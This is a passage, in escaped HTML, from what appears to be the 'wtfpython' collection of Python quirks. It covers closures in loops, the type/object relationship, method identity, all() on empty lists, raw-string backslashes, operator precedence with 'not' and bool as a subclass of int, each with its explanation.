512, 512, 512, 512]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;When defining a function inside a loop that uses the loop variable in its body, the loop function&#39;s closure is bound to the &lt;em&gt;variable&lt;/em&gt;, not its &lt;em&gt;value&lt;/em&gt;. The function looks up &lt;code&gt;x&lt;/code&gt; in the surrounding context, rather than using the value of &lt;code&gt;x&lt;/code&gt; at the time the function is created. So all of the functions use the latest value assigned to the variable for computation. We can see that it&#39;s using the &lt;code&gt;x&lt;/code&gt; from the surrounding context (i.e. &lt;em&gt;not&lt;/em&gt; a local variable) with:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; import inspect&#xA;&amp;gt;&amp;gt;&amp;gt; inspect.getclosurevars(funcs[0])&#xA;ClosureVars(nonlocals={}, globals={&#39;x&#39;: 6}, builtins={}, unbound=set())&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Since &lt;code&gt;x&lt;/code&gt; is a global value, we can change the value that the &lt;code&gt;funcs&lt;/code&gt; will lookup and return by updating &lt;code&gt;x&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = 42&#xA;&amp;gt;&amp;gt;&amp;gt; [func() for func in funcs]&#xA;[42, 42, 42, 42, 42, 42, 42]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To get the desired behavior you can pass in the loop variable as a named variable to the function. &lt;strong&gt;Why does this work?&lt;/strong&gt; Because this will define the variable &lt;em&gt;inside&lt;/em&gt; the function&#39;s scope. It will no longer go to the surrounding (global) scope to look up the variables value but will create a local variable that stores the value of &lt;code&gt;x&lt;/code&gt; at that point in time.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;funcs = []&#xA;for x in range(7):&#xA;    def some_func(x=x):&#xA;        return x&#xA;    funcs.append(some_func)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; funcs_results = [func() for func in funcs]&#xA;&amp;gt;&amp;gt;&amp;gt; funcs_results&#xA;[0, 1, 2, 3, 4, 5, 6]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is not longer using the &lt;code&gt;x&lt;/code&gt; in the global scope:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; inspect.getclosurevars(funcs[0])&#xA;ClosureVars(nonlocals={}, globals={}, builtins={}, unbound=set())&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ The chicken-egg problem *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 60730dc2-0d79-4416-8568-2a63323b3ce8 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; isinstance(3, int)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(type, object)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(object, type)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;So which is the &#34;ultimate&#34; base class? There&#39;s more to the confusion by the way,&lt;/p&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; class A: pass&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(A, A)&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(type, type)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(object, object)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; issubclass(int, object)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(type, object)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(object, type)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;type&lt;/code&gt; is a &lt;a href=&#34;https://realpython.com/python-metaclasses/&#34;&gt;metaclass&lt;/a&gt; in Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Everything&lt;/strong&gt; is an &lt;code&gt;object&lt;/code&gt; in Python, which includes classes as well as their objects (instances).&lt;/li&gt; &#xA; &lt;li&gt;class &lt;code&gt;type&lt;/code&gt; is the metaclass of class &lt;code&gt;object&lt;/code&gt;, and every class (including &lt;code&gt;type&lt;/code&gt;) has inherited directly or indirectly from &lt;code&gt;object&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;There is no real base class among &lt;code&gt;object&lt;/code&gt; and &lt;code&gt;type&lt;/code&gt;. The confusion in the above snippets is arising because we&#39;re thinking about these relationships (&lt;code&gt;issubclass&lt;/code&gt; and &lt;code&gt;isinstance&lt;/code&gt;) in terms of Python classes. The relationship between &lt;code&gt;object&lt;/code&gt; and &lt;code&gt;type&lt;/code&gt; can&#39;t be reproduced in pure python. To be more precise the following relationships can&#39;t be reproduced in pure Python, &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;class A is an instance of class B, and class B is an instance of class A.&lt;/li&gt; &#xA;   &lt;li&gt;class A is an instance of itself.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;These relationships between &lt;code&gt;object&lt;/code&gt; and &lt;code&gt;type&lt;/code&gt; (both being instances of each other as well as themselves) exist in Python because of &#34;cheating&#34; at the implementation level.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Subclass relationships&lt;/h3&gt; &#xA;&lt;!-- Example ID: 9f6d8cf0-e1b5-42d0-84a0-4cfab25a0bc0 ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; from collections import Hashable&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(list, object)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(object, Hashable)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(list, Hashable)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The Subclass relationships were expected to be transitive, right? (i.e., if &lt;code&gt;A&lt;/code&gt; is a subclass of &lt;code&gt;B&lt;/code&gt;, and &lt;code&gt;B&lt;/code&gt; is a subclass of &lt;code&gt;C&lt;/code&gt;, the &lt;code&gt;A&lt;/code&gt; &lt;em&gt;should&lt;/em&gt; a subclass of &lt;code&gt;C&lt;/code&gt;)&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Subclass relationships are not necessarily transitive in Python. Anyone is allowed to define their own, arbitrary &lt;code&gt;__subclasscheck__&lt;/code&gt; in a metaclass.&lt;/li&gt; &#xA; &lt;li&gt;When &lt;code&gt;issubclass(cls, Hashable)&lt;/code&gt; is called, it simply looks for non-Falsey &#34;&lt;code&gt;__hash__&lt;/code&gt;&#34; method in &lt;code&gt;cls&lt;/code&gt; or anything it inherits from.&lt;/li&gt; &#xA; &lt;li&gt;Since &lt;code&gt;object&lt;/code&gt; is hashable, but &lt;code&gt;list&lt;/code&gt; is non-hashable, it breaks the transitivity relation.&lt;/li&gt; &#xA; &lt;li&gt;More detailed explanation can be found &lt;a href=&#34;https://www.naftaliharris.com/blog/python-subclass-intransitivity/&#34;&gt;here&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Methods equality and identity&lt;/h3&gt; &#xA;&lt;!-- Example ID: 94802911-48fe-4242-defa-728ae893fa32 ---&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SomeClass:&#xA;    def method(self):&#xA;        pass&#xA;&#xA;    @classmethod&#xA;    def classm(cls):&#xA;        pass&#xA;&#xA;    @staticmethod&#xA;    def staticm():&#xA;        pass&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(SomeClass.method is SomeClass.method)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; print(SomeClass.classm is SomeClass.classm)&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; print(SomeClass.classm == SomeClass.classm)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; print(SomeClass.staticm is SomeClass.staticm)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Accessing &lt;code&gt;classm&lt;/code&gt; twice, we get an equal object, but not the &lt;em&gt;same&lt;/em&gt; one? Let&#39;s see what happens with instances of &lt;code&gt;SomeClass&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;o1 = SomeClass()&#xA;o2 = SomeClass()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(o1.method == o2.method)&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; print(o1.method == o1.method)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; print(o1.method is o1.method)&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; print(o1.classm is o1.classm)&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; print(o1.classm == o1.classm == o2.classm == SomeClass.classm)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; print(o1.staticm is o1.staticm is o2.staticm is SomeClass.staticm)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Accessing&lt;code&gt; classm&lt;/code&gt; or &lt;code&gt;method&lt;/code&gt; twice, creates equal but not &lt;em&gt;same&lt;/em&gt; objects for the same instance of &lt;code&gt;SomeClass&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Functions are &lt;a href=&#34;https://docs.python.org/3/howto/descriptor.html&#34;&gt;descriptors&lt;/a&gt;. Whenever a function is accessed as an attribute, the descriptor is invoked, creating a method object which &#34;binds&#34; the function with the object owning the attribute. If called, the method calls the function, implicitly passing the bound object as the first argument (this is how we get &lt;code&gt;self&lt;/code&gt; as the first argument, despite not passing it explicitly).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; o1.method&#xA;&amp;lt;bound method SomeClass.method of &amp;lt;__main__.SomeClass object at ...&amp;gt;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Accessing the attribute multiple times creates a method object every time! Therefore &lt;code&gt;o1.method is o1.method&lt;/code&gt; is never truthy. Accessing functions as class attributes (as opposed to instance) does not create methods, however; so &lt;code&gt;SomeClass.method is SomeClass.method&lt;/code&gt; is truthy.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; SomeClass.method&#xA;&amp;lt;function SomeClass.method at ...&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;classmethod&lt;/code&gt; transforms functions into class methods. Class methods are descriptors that, when accessed, create a method object which binds the &lt;em&gt;class&lt;/em&gt; (type) of the object, instead of the object itself.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; o1.classm&#xA;&amp;lt;bound method SomeClass.classm of &amp;lt;class &#39;__main__.SomeClass&#39;&amp;gt;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Unlike functions, &lt;code&gt;classmethod&lt;/code&gt;s will create a method also when accessed as class attributes (in which case they bind the class, not to the type of it). So &lt;code&gt;SomeClass.classm is SomeClass.classm&lt;/code&gt; is falsy.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; SomeClass.classm&#xA;&amp;lt;bound method SomeClass.classm of &amp;lt;class &#39;__main__.SomeClass&#39;&amp;gt;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A method object compares equal when both the functions are equal, and the bound objects are the same. So &lt;code&gt;o1.method == o1.method&lt;/code&gt; is truthy, although not the same object in memory.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;staticmethod&lt;/code&gt; transforms functions into a &#34;no-op&#34; descriptor, which returns the function as-is. No method objects are ever created, so comparison with &lt;code&gt;is&lt;/code&gt; is truthy.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; o1.staticm&#xA;&amp;lt;function SomeClass.staticm at ...&amp;gt;&#xA;&amp;gt;&amp;gt;&amp;gt; SomeClass.staticm&#xA;&amp;lt;function SomeClass.staticm at ...&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Having to create new &#34;method&#34; objects every time Python calls instance methods and having to modify the arguments every time in order to insert &lt;code&gt;self&lt;/code&gt; affected performance badly. CPython 3.7 &lt;a href=&#34;https://bugs.python.org/issue26110&#34;&gt;solved it&lt;/a&gt; by introducing new opcodes that deal with calling methods without creating the temporary method objects. This is used only when the accessed function is actually called, so the snippets here are not affected, and still generate methods :)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;▶ All-true-ation *&lt;/h3&gt; &#xA;&lt;!-- Example ID: dfe6d845-e452-48fe-a2da-0ed3869a8042 --&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; all([True, True, True])&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; all([True, True, False])&#xA;False&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; all([])&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; all([[]])&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; all([[[]]])&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Why&#39;s this True-False alteration?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The implementation of &lt;code&gt;all&lt;/code&gt; function is equivalent to&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def all(iterable):&#xA;    for element in iterable:&#xA;        if not element:&#xA;            return False&#xA;    return True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;all([])&lt;/code&gt; returns &lt;code&gt;True&lt;/code&gt; since the iterable is empty.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;all([[]])&lt;/code&gt; returns &lt;code&gt;False&lt;/code&gt; because the passed array has one element, &lt;code&gt;[]&lt;/code&gt;, and in python, an empty list is falsy.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;all([[[]]])&lt;/code&gt; and higher recursive variants are always &lt;code&gt;True&lt;/code&gt;. This is because the passed array&#39;s single element (&lt;code&gt;[[...]]&lt;/code&gt;) is no longer empty, and lists with values are truthy.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ The surprising comma&lt;/h3&gt; &#xA;&lt;!-- Example ID: 31a819c8-ed73-4dcc-84eb-91bedbb51e58 ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;lt; 3.6):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; def f(x, y,):&#xA;...     print(x, y)&#xA;...&#xA;&amp;gt;&amp;gt;&amp;gt; def g(x=4, y=5,):&#xA;...     print(x, y)&#xA;...&#xA;&amp;gt;&amp;gt;&amp;gt; def h(x, **kwargs,):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1&#xA;    def h(x, **kwargs,):&#xA;                     ^&#xA;SyntaxError: invalid syntax&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; def h(*args,):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1&#xA;    def h(*args,):&#xA;                ^&#xA;SyntaxError: invalid syntax&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Trailing comma is not always legal in formal parameters list of a Python function.&lt;/li&gt; &#xA; &lt;li&gt;In Python, the argument list is defined partially with leading commas and partially with trailing commas. This conflict causes situations where a comma is trapped in the middle, and no rule accepts it.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Note:&lt;/strong&gt; The trailing comma problem is &lt;a href=&#34;https://bugs.python.org/issue9232&#34;&gt;fixed in Python 3.6&lt;/a&gt;. The remarks in &lt;a href=&#34;https://bugs.python.org/issue9232#msg248399&#34;&gt;this&lt;/a&gt; post discuss in brief different usages of trailing commas in Python.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Strings and the backslashes&lt;/h3&gt; &#xA;&lt;!-- Example ID: 6ae622c3-6d99-4041-9b33-507bd1a4407b ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(&#34;\&#34;&#34;)&#xA;&#34;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; print(r&#34;\&#34;&#34;)&#xA;\&#34;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; print(r&#34;\&#34;)&#xA;File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1&#xA;    print(r&#34;\&#34;)&#xA;              ^&#xA;SyntaxError: EOL while scanning string literal&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; r&#39;\&#39;&#39; == &#34;\\&#39;&#34;&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;In a usual python string, the backslash is used to escape characters that may have a special meaning (like single-quote, double-quote, and the backslash itself). &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &#34;wt\&#34;f&#34;&#xA;&#39;wt&#34;f&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;In a raw string literal (as indicated by the prefix &lt;code&gt;r&lt;/code&gt;), the backslashes pass themselves as is along with the behavior of escaping the following character. &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; r&#39;wt\&#34;f&#39; == &#39;wt\\&#34;f&#39;&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; print(repr(r&#39;wt\&#34;f&#39;)&#xA;&#39;wt\\&#34;f&#39;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; print(&#34;\n&#34;)&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; print(r&#34;\\n&#34;)&#xA;&#39;\\n&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;This means when a parser encounters a backslash in a raw string, it expects another character following it. And in our case (&lt;code&gt;print(r&#34;\&#34;)&lt;/code&gt;), the backslash escaped the trailing quote, leaving the parser without a terminating quote (hence the &lt;code&gt;SyntaxError&lt;/code&gt;). That&#39;s why backslashes don&#39;t work at the end of a raw string.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ not knot!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 7034deb1-7443-417d-94ee-29a800524de8 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;x = True&#xA;y = False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; not x == y&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; x == not y&#xA;  File &#34;&amp;lt;input&amp;gt;&#34;, line 1&#xA;    x == not y&#xA;           ^&#xA;SyntaxError: invalid syntax&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Operator precedence affects how an expression is evaluated, and &lt;code&gt;==&lt;/code&gt; operator has higher precedence than &lt;code&gt;not&lt;/code&gt; operator in Python.&lt;/li&gt; &#xA; &lt;li&gt;So &lt;code&gt;not x == y&lt;/code&gt; is equivalent to &lt;code&gt;not (x == y)&lt;/code&gt; which is equivalent to &lt;code&gt;not (True == False)&lt;/code&gt; finally evaluating to &lt;code&gt;True&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;But &lt;code&gt;x == not y&lt;/code&gt; raises a &lt;code&gt;SyntaxError&lt;/code&gt; because it can be thought of being equivalent to &lt;code&gt;(x == not) y&lt;/code&gt; and not &lt;code&gt;x == (not y)&lt;/code&gt; which you might have expected at first sight.&lt;/li&gt; &#xA; &lt;li&gt;The parser expected the &lt;code&gt;not&lt;/code&gt; token to be a part of the &lt;code&gt;not in&lt;/code&gt; operator (because both &lt;code&gt;==&lt;/code&gt; and &lt;code&gt;not in&lt;/code&gt; operators have the same precedence), but after not being able to find an &lt;code&gt;in&lt;/code&gt; token following the &lt;code&gt;not&lt;/code&gt; token, it raises a &lt;code&gt;SyntaxError&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Half triple-quoted strings&lt;/h3&gt; &#xA;&lt;!-- Example ID: c55da3e2-1034-43b9-abeb-a7a970a2ad9e ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(&#39;wtfpython&#39;&#39;&#39;)&#xA;wtfpython&#xA;&amp;gt;&amp;gt;&amp;gt; print(&#34;wtfpython&#34;&#34;&#34;)&#xA;wtfpython&#xA;&amp;gt;&amp;gt;&amp;gt; # The following statements raise `SyntaxError`&#xA;&amp;gt;&amp;gt;&amp;gt; # print(&#39;&#39;&#39;wtfpython&#39;)&#xA;&amp;gt;&amp;gt;&amp;gt; # print(&#34;&#34;&#34;wtfpython&#34;)&#xA;  File &#34;&amp;lt;input&amp;gt;&#34;, line 3&#xA;    print(&#34;&#34;&#34;wtfpython&#34;)&#xA;                        ^&#xA;SyntaxError: EOF while scanning triple-quoted string literal&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Python supports implicit &lt;a href=&#34;https://docs.python.org/3/reference/lexical_analysis.html#string-literal-concatenation&#34;&gt;string literal concatenation&lt;/a&gt;, Example, &lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; print(&#34;wtf&#34; &#34;python&#34;)&#xA;wtfpython&#xA;&amp;gt;&amp;gt;&amp;gt; print(&#34;wtf&#34; &#34;&#34;) # or &#34;wtf&#34;&#34;&#34;&#xA;wtf&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;&#39;&#39;&#39;&lt;/code&gt; and &lt;code&gt;&#34;&#34;&#34;&lt;/code&gt; are also string delimiters in Python which causes a SyntaxError because the Python interpreter was expecting a terminating triple quote as delimiter while scanning the currently encountered triple quoted string literal.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ What&#39;s wrong with booleans?&lt;/h3&gt; &#xA;&lt;!-- Example ID: 0bba5fa7-9e6d-4cd2-8b94-952d061af5dd ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# A simple example to count the number of booleans and&#xA;# integers in an iterable of mixed data types.&#xA;mixed_list = [False, 1.0, &#34;some_string&#34;, 3, True, [], False]&#xA;integers_found_so_far = 0&#xA;booleans_found_so_far = 0&#xA;&#xA;for item in mixed_list:&#xA;    if isinstance(item, int):&#xA;        integers_found_so_far += 1&#xA;    elif isinstance(item, bool):&#xA;        booleans_found_so_far += 1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; integers_found_so_far&#xA;4&#xA;&amp;gt;&amp;gt;&amp;gt; booleans_found_so_far&#xA;0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; some_bool = True&#xA;&amp;gt;&amp;gt;&amp;gt; &#34;wtf&#34; * some_bool&#xA;&#39;wtf&#39;&#xA;&amp;gt;&amp;gt;&amp;gt; some_bool = False&#xA;&amp;gt;&amp;gt;&amp;gt; &#34;wtf&#34; * some_bool&#xA;&#39;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def tell_truth():&#xA;    True = False&#xA;    if True == False:&#xA;        print(&#34;I have lost faith in truth!&#34;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;lt; 3.x):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; tell_truth()&#xA;I have lost faith in truth!&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;bool&lt;/code&gt; is a subclass of &lt;code&gt;int&lt;/code&gt; in Python&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; issubclass(bool, int)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(int, bool)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;And thus, &lt;code&gt;True&lt;/code&gt; and &lt;code&gt;False&lt;/code&gt; are instances of &lt;code&gt;int&lt;/code&gt;&lt;/p&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; isinstance(True, int)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(False, int)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;The integer value of &lt;code&gt;True&lt;/code&gt; is &lt;code&gt;1&lt;/code&gt; and that of &lt;code&gt;False&lt;/code&gt; is &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt; &lt;pre&gt;&lt;code 